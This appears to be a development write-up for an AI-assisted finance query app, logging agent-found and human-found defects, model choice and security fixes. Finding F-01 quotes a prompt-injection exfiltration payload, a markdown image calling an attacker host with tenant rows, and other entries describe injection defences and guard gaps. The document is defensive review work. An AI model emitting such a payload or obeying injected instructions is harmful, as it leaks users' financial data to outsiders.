# AI-assisted development

## Tools used

The code was built with Claude Code, run as an **agent team** under a team lead:

- **Phase 0 (architect, Opus 5.5):** scaffolded the pnpm workspace, Docker Compose, root scripts and CI. It wrote the contracts in `packages/shared` (zod schemas for tool args, REST queries and responses, audit enums, stream data parts) and an empty Hono `AppType`. Gate: install, typecheck, lint and test green.
- **Phase 1 (four Sonnet 5.5 builders in parallel):** db-builder (schema, roles, seed), api-builder (auth, tenant middleware, repository, REST routes), ai-builder (tools, guard, orchestrator, audit, evals), web-builder (SPA).
  - Ownership was split by path (`docs/PLAN.md`), so no two builders edited the same file.
  - Builders could not change contracts without the architect's approval in `docs/TASKS.md`.
  - Each builder was done only when its own tests passed and the workspace typecheck and lint stayed green. Phase 1 ended with 269 tests passing on a fresh `db:reset`.
- **Phase 2 (reviewer, Opus 5.5, independent):** audited every module against the requirement checklist and the security rules. Findings are in `docs/review-log.md` (finding → severity → fix → verified).
  - The reviewer read the installed library sources instead of the builders' notes, attacked its own API instance with curl over cookie and bearer, and probed `handleAsk` from scratch scripts.
  - It found **11 issues**: 1 high (F-01), 3 medium, 7 low. They became fix tasks T-201..T-208.
  - The re-verification round confirmed all 11 fixes and found two more: F-13, a regression caused by one of the fixes, and F-14. The live smoke and UI runs then added F-12 and F-16 to F-20; the candidate found F-20.
- **Phase 3 (architect):** these docs, the requirements matrix, the ADRs and the agent-context files. Live runs against Workers AI followed once credentials were available.

## Meaningful example: invalid tool calls escaped the audit (F-02)

**What the generated code did.** ai-builder's tool layer looked careful:
- The SDK schema accepted any value (`passthroughInput`).
- Real validation ran inside `execute` with the strict shared schemas.
- `raw_args` was written verbatim to `ai_tool_calls`, and a bad call returned a structured error with no query.

24 invalid-argument tests passed against the real database, including an injected `tenant_id`. Everything rested on one unstated assumption: that **every call the model proposes reaches `execute`**.

**How it was caught.** The reviewer read `ai@7.0.157`'s `parseToolCall` instead of trusting the tests. An unknown tool name (`NoSuchToolError`) or unparseable JSON input (`InvalidToolInputError`) is turned into an `{ invalid: true }` call, answered with a `tool-error`, and `execute` is never called. A scripted probe with `MockLanguageModelV4` confirmed it:
- The model calls `create_refund`: **0 `ai_tool_calls` rows**, request status `ok`.
- Malformed JSON args three times: **0 rows**. The validation-failure cap never triggered and the loop kept going.

The event the audit most needs to capture, the model reaching for a write tool, left no trace. None of the 269 green tests covered the case.

**The fix (T-202).** `onStepEnd` in `apps/api/src/orchestrator/index.ts` now walks `step.toolCalls` and records every call with `invalid === true`. Each one gets `validated = false`, the raw input and the SDK error name, and counts toward the validation cap:

```ts
for (const call of step.toolCalls) {
  if (!call.invalid) continue;
  recorder.validationFailures++;
  recorder.add({ toolName, rawArgs: call.input ?? null, validated: false, validationError: `${err.name}: ${err.message}`, … });
}
```

Two workflow tests pin it: "an unknown tool name (create_refund) is audited validated=false and never executed", and malformed JSON ending the loop with `validation_error`.

## Second example: live runs caught what the gate could not (F-12, F-16–F-20)

With every test green, the first live `pnpm smoke:live` (2026-10-30, glm-4.7-flash, Clef-flash guard) passed its own checks: one validated `search_transactions` call, 5 rows, 5 cited IDs, 0 ungrounded. Reading the answer showed it said **"3 failed transactions" while listing all 5**.

- **Why the checks missed it:** the grounding check verifies cited IDs, not numbers, and mocked models only say what the test scripts tell them.
- **What it is:** a model counting error, recorded as finding F-12 and fix task T-210 (ai-builder).
- **F-12 lesson:** reading real model output is part of the review, and counts in prose need the same discipline as citations.

Five more defects surfaced only when the real UI was used against the live model. That makes **six defects found by live use after a green gate and a reviewer sign-off pass**:

- **F-16, a step timeout that killed normal answers.**
  - **Symptom:** "Why did wallet WALLET-A-001 have failed transactions?" was audited `timeout` at 17.2 s, although the tool step took 37 ms.
  - **Root cause:** the generated orchestrator capped every step at 15 s of wall-clock time, retries included. glm-4.7-flash quietly ran hidden reasoning before answering, and nothing switched it off.
  - **Why tests missed it:** they used fake timers and instant mocks; the thinking-on eval p95 of 19 s showed the margin was already gone.
  - **Fix (T-214):**
    - send `chat_template_kwargs.enable_thinking=false`, accepted live; output tokens fell from 406 to 238;
    - replace the wall-clock step cap with idle-based first-chunk and between-chunk timeouts;
    - raise the request budget to 45 s, now the only wall-clock bound (D-16);
    - add a test that a slow but streaming step succeeds.
- **F-17, a dangling question answered twice.**
  - **Symptom:** after that timed-out question, the next question was sent with the unanswered one still in the history, so the model answered both: an extra search and a muddled reply.
  - **Root cause:** the server kept every user turn. The reviewer's F-13 fix had made history handling stricter, but it did not consider turns that never got an answer.
  - **Fix (T-214):** earlier user turns with no assistant text after them are dropped. A test asserts the dangling turn is absent from the prompt. The live re-check made one aggregate call and answered "There were 4 failed transactions yesterday" in 1.75 s.

- **F-18, earlier questions blended into the new one.**
  - **Symptom:** after "Why did wallet WALLET-A-001 have failed transactions?", the next question, "Show the largest completed outgoing transactions this week", was answered "for both questions". The search carried `wallet_id: WALLET-A-001` over, returned 3 rows instead of 7, and missed the €4,800 tie.
  - **Root cause:** because client assistant turns were (correctly) dropped, the model saw consecutive user turns and treated the earlier ones as unanswered.
  - **Fix (T-215, D-17):** single-turn model input. Only the latest question reaches the model and the guard; history is display-only. The live re-check returned the 7-row set with no `wallet_id`.
- **F-19 (high), an answer that contradicted its own evidence while every cited ID was real.**
  - **Symptom:** the tool returned 5 failed rows, 4 with reasons. The answer called two `insufficient_funds` rows "not recorded (null)" and claimed those reasons "do not appear in the records".
  - **Why grounding missed it:** the check verifies IDs only.
  - **Fix (T-216, T-218):**
    - a deterministic fact check of failure-reason claims against the cited rows (`checkFacts`, audited `fact_mismatch:`);
    - null reasons are sent to the model as the words "not recorded";
    - a speculation warning;
    - an A/B eval that made thinking on the default (D-18; later superseded by the model change, D-21).
- **F-20, language drift, found by the candidate (the user), not by an agent.**
  - **Symptom:** an answer drifted into Chinese mid-sentence ("…for a赔付 supplier payout…").
  - **Root cause:** nothing in the prompt or the output path constrained language.
  - **First fix (T-217, D-19):** an English-only prompt rule plus a deterministic stream filter that deleted non-Latin characters, audited `non_english_output:<n>`.
  - **Human correction (D-21):** the user overruled the lead's filter.
    - Deleting characters hides the symptom and can silently drop information from a finance answer.
    - A later UI run also showed stray "₹" symbols before timestamps, so the drift was a model property, not a one-off.
    - Decision: remove the filter, keep the prompt rule, and change the default model to `@cf/openai/gpt-oss-120b` (English-first, on the Free plan). It costs about twice glm-4.7-flash's Neurons per question (~102 vs ~47).
    - The T-219 comparison then backed gpt-oss-120b on the eval (best p95, 0 non-Latin characters), but live use later replaced it too; see "Choosing the model" below.
    - This is a good example of human review: the agents had produced a technically correct, tested mitigation, and the human judged that it solved the wrong problem.

**Lesson.** Mocked tests check mechanics: the right tool is called, arguments are validated, the audit is written, the loop is bounded. Only real model output reveals behavioural defects such as wrong counts, contradicted evidence, blended questions, timeouts on slow reasoning and language drift. A **live UI review is therefore a required gate**, not an optional demo. Each live finding got a deterministic check or a regression test, so the next gate run covers it.

## Third example: a perfect score that measured nothing (F-21)

ai-builder caught this during the T-219 model comparison.

- **What happened:** the first gpt-oss-120b run scored a flawless 100% on grounding and fact accuracy. ai-builder asked why it was 100% instead of accepting the number.
- **The cause:** gpt-oss writes transaction IDs with U+2011 non-breaking hyphens (`TXN‑A‑0052`). The grounding, count and fact checks extract IDs with an ASCII regex, so they found **no IDs at all** and passed vacuously. A model that cited invented IDs would have scored the same.
- **The fix:**
  - The checks now normalise Unicode dashes before matching; the displayed text is unchanged.
  - Prompt rule 4 asks for ASCII hyphens.
  - The re-run scores honest numbers (92.3% grounded).
- **Two more gpt-oss defects found in the same pass:** Workers AI rejected an assistant tool-call message with `content: null`, and a replayed `reasoning_content` (HTTP 400). `sanitizeMessages` now normalises both for non-GLM models.
- **Lesson:** a metric that looks perfect deserves the most suspicion. Every deterministic check needs a positive control: a case where it *must* fire.

## Fourth example: choosing the model (D-18, D-21, D-23)

This is the strongest case of live review driving a decision.

**Every candidate passed the mocked gate.** Mocks script the model, so the 300+ tests say nothing about how a real model behaves.

**Each model failed in a different way, and only under real use:**
- **glm-4.7-flash:**
  - miscounted rows in prose (F-12);
  - contradicted its own evidence with thinking off (F-19);
  - drifted into Chinese mid-sentence (F-20), then emitted stray "₹" before timestamps.
- **gpt-oss-120b:** the eval was clean, but the live UI showed truncated answers recorded as `ok` (F-22), then raw harmony reasoning and tool-call markup leaked as the answer in about 25% of requests. Its Unicode-hyphen IDs had also made the checks vacuous (F-21).
- **gpt-oss-20b:** empty answers on 6 of 14 eval questions.

**Humans corrected the agents twice:**
1. The lead's first response to the language drift was a text filter (D-19). The user overruled it: deleting text hides the defect, and the model should be changed instead (D-21).
2. The lead then declined to retry malformed output automatically, for the same reason (D-22), and recommended the switch. The user approved it (D-23).

**The final choice came from evidence, not vendor claims.** `@cf/google/gemma-4-26b-a4b-it` was chosen on:
- a 14-question eval: best scores, at 100% on tool choice, key args, valid args and fact accuracy;
- measured cost: about 43 Neurons per question, or about 235 a day;
- 0 non-Latin characters;
- a live Free-plan check.

Its slower tail (p95 20 s) was accepted. In live UI verification, all four example questions were `ok`, with 0 ungrounded IDs and no warnings. The history and tables are in ADR 0007 and `EVALS.md`.

## Fifth example: user feedback made a correct check understandable (T-222, T-223)

- **What the user saw:** a warning on an answer that said "16 completed". The database has 15; the model had computed 18 minus "a couple" when it had flagged 3. The count check was right, but the warning was titled "Unverified citation" and gave no server numbers, so the user read it as a bug.
- **The fix improved explainability without weakening the check:**
  - an optional `kind` on the `data-ungrounded` data part (a minimal shared-contract change, authorised and noted in `docs/TASKS.md`);
  - per-kind titles in the UI;
  - the server's own numbers in the message, so the warning says what the records show.
- **Lesson:** a check only helps if users can tell why it fired.

## Sixth example: a trade-off reversed by user feedback (D-17 → D-24)

- **The first fix.** Replaying user-only history made the model blend earlier questions into new ones (F-18). The lead's fix was single-turn input (D-17): only the latest question reached the model. It worked, and the gate and the reviewer passed it.
- **What the user caught.** In the UI, follow-ups broke. "Show the largest completed outgoing transactions this week." answered TXN-B-0039 and TXN-B-0041. Then "which wallets did this transactions?" got "Could you please specify which transactions…" (F-25). The user also asked for a "New conversation" button.
- **The fix for both: server-stored history (D-24, ADR 0008).**
  - Answered pairs are produced and stored by the server, per user and tenant. Client history is still ignored, so forging stays impossible.
  - Only `ok`/`no_results` turns are stored, so failed or refused questions cannot blend in (F-18 stays fixed).
  - `search_transactions.transaction_ids` lets a follow-up re-read exactly the cited rows. Live, the follow-up made one call with those two IDs and answered with the right wallets.
- **Integration catch.** Four builders implemented D-24 in parallel, and the same filter ended up with two names: the shared `transaction_ids` and an internal `transactionIds`. The lead's gate failed on typecheck before the code ran. Had the mismatch reached runtime, the ID restriction would have been silently dropped, and a follow-up would have returned unrelated rows. After that, one name was used end to end (T-232).

## External security review (OWASP_ANALYSIS.md)

A second, independent AI tool reviewed the working tree against the OWASP Top 10:2025, the API Top 10 and the LLM Top 10, and changed no code.

It found:
- **an integration gap in work in progress:** the conversation RLS policies had landed before the code that sets `app.user_id`, so valid `/api/ask` requests failed closed with a 500 (OWASP-06);
- **deployment-grade issues:** a Postgres port published on all interfaces with a default superuser password; trusting forwarding headers; secret rotation that does not revoke unsigned bearer tokens; no `no-store` caching header; unbounded auth bodies and pool waits.

The agents' own gate and reviewer had not raised these. They mostly concern deployment rather than the tenant logic the tests target. This is useful cross-checking evidence: a reviewer with a different lens finds a different class of defect. Each finding has a disposition in `OWASP_RESPONSE.md`.

## How output was reviewed

- **Requirement traceability:** each of R1–R39 maps to a file or a named test (`docs/REQUIREMENTS.md`). Every quoted test name was checked with grep before it was listed.
- **An independent reviewer:** a different agent from the builders. It ran the code and read the library sources, then filed findings as tasks, and only the reviewer can mark a finding verified.
- **Tests before sign-off:** builders added tests for each fix. For example: a remote markdown image renders no external `<img>`; an earlier-turn injection is blocked before the model is called; a cookie request from an untrusted `Origin` gets 403.
- **Independent re-runs by the lead:** the lead re-ran the gate rather than trusting status lines. That caught a **stale builder claim**: ai-builder reported the `/api/ask` wiring as still pending after api-builder had already wired it. The disagreement surfaced because the lead's own gate run passed.
- **Judgement calls logged:** process decisions and deviations from the brief are dated in [`DECISIONS.md`](DECISIONS.md), for example D-13 (independent gate re-runs), D-14 (the guard decision-table change) and D-21/D-23 (the model choices).
- **Live smoke and evals:** `pnpm smoke:live`, `pnpm eval:llm` and `pnpm eval:guard` against the real endpoints, with results recorded in [`EVALS.md`](EVALS.md).

## Corrections (from `docs/review-log.md`)

- **F-01 (high):** the vendored markdown renderer kept library defaults that allow images and links from any origin. A prompt-injected transaction description could make the model emit `![](https://attacker/?d=<rows>)`, which leaks the tenant's own data through the browser, and backend scoping cannot stop that. Fixed with `allowedImagePrefixes: []`, same-origin links and a CSP (`img-src 'self' data:; connect-src 'self'`), plus tests.
- **F-03:** the guard checked only the latest message while earlier client-supplied turns reached the model unguarded, and assistant turns could be forged. Now the guard checks every user turn the model sees, and client assistant turns are dropped.
- **F-04:** the write-verb heuristic was tuned to its own eval set and missed "Issue a refund…", "I want you to refund…". The rules were extended and held-out paraphrases added to `evals/guard.jsonl`.
- **F-05:** two tests "proved" untrusted-data wrapping by finding a marker string that the system prompt itself contains. The assertions now target the `role: 'tool'` message only.
- **F-06:**
  - A refused Better Auth `set-active` cleared the user's own active organization.
  - The organization endpoints are no longer exposed.
  - The UI offers re-sign-in.
- **F-07:** cookie-authenticated `POST /api/ask` lacked an Origin check; a CSRF origin middleware was added (bearer requests unaffected).
- **F-08:** step, retry and timeout caps had no upper bound, and the `.env.example` placeholder secret was accepted. Bounds were added and the placeholder is rejected.
- **F-09:**
  - The tool timeout had no effect; `toolMs` was removed and `statement_timeout` is documented as the bound.
  - The Clef guard could be built with a real fetch under test.
  - Quota 429s were retried.
  - A null tool input was audited as `{}`.
  - The reviewer had called the step-cap error path dead code. Ai-builder showed that `AI_ToolChoiceViolationError` is still thrown for a stray final-step call, so it is now classified as `loop_limit`. That corrected the reviewer, not the builder.
  - Client aborts are audited as `llm_error` / `client_aborted`.
- **F-10:**
  - `/assistant?q=` auto-sent its question; it now only prefills.
  - Fail-closed guard copy.
  - Distinct copy for the API's own rate limit.
- **F-11:** the app roles kept PUBLIC `CONNECT`/`TEMP`; revoked, with a test that `ledger_reader` cannot create temp tables.

**Found in the reviewer's re-verification round:**
- **F-13:** a regression introduced by the F-03 fix. Guarding all user turns joined together made one blocked question block every later question in the chat. Each turn is now guarded separately, and only the latest turn can refuse the request.
- **F-14:** under the Clef provider, the brief's decision table let only write verbs escalate from the heuristic, so enabling credentials *lowered* protection against override phrases, tenant claims and SQL fragments. The architect changed the decision table (ADR 0006).

**Found during the model comparison and live UI runs:**
- **F-21:** gpt-oss wrote transaction IDs with U+2011 hyphens, so the ID, count and fact checks matched nothing and scored a vacuous 100%. The checks now normalise Unicode dashes. In the same pass, `sanitizeMessages` fixed HTTP 400s from `content: null` and a replayed `reasoning_content`.
- **F-22 (high):** answers were cut off mid-sentence and recorded as `ok`, because no output cap was set and `finish_reason=length` was ignored.
  - `LLM_MAX_OUTPUT_TOKENS` (2048) is now passed as `maxOutputTokens`.
  - A capped answer is audited `truncated`, and the UI warns that it was cut off.
- **`malformed_output` detection:** raw `<|…|>` tool-call or reasoning markup in the answer text is audited `llm_error` / `malformed_output` and shown as the error banner with "Try again". It is deliberately not retried (D-22).
- **F-26:** stored answers could carry quoted injection text (e.g. `TXN-A-0036`) back into the prompt outside the untrusted wrapper. They are now replayed inside a "context only" untrusted block, and answers that raised warnings are not stored (T-225; ADR 0008, Injection and replay).
- **F-27:** the F-18 regression test passed with or without the fix, because the mock scripted the asserted tool input itself. It now asserts the prompt shape `[system, user, assistant, user]`, with no consecutive user turns.
- **F-28:** pressing ⌘K / Ctrl+K crashed the page. The generated `CommandDialog` rendered the cmdk primitives without the `<Command>` root, and no test opened the dialog. The root is now provided in one place, and `command-menu.test.tsx` opens the menu, types and selects an item.

**Human-driven product corrections:**
- **The redesign (D-25).** The user asked for a Midday-inspired visual language: rounded and calm, with a question bubble, a plain answer and inline tool rows. That replaced the agents' earlier strict monochrome, square-cornered styling. The agents reimplemented the look from tokens only, because Midday is AGPL-3.0 and copying its code was ruled out. Generative UI for chart questions (D-26) shipped in the same pass.

Verification status of each fix: see the Status column in `docs/review-log.md`.

---

## Candidate's own review notes (to be completed by the candidate before submission)

> _This section is intentionally left for the candidate. Describe in your own words what you reviewed personally, what you changed or rejected, which outputs you verified by hand (for example the curl demo, the live smoke run, the UI flow), and anything you would do differently._

-
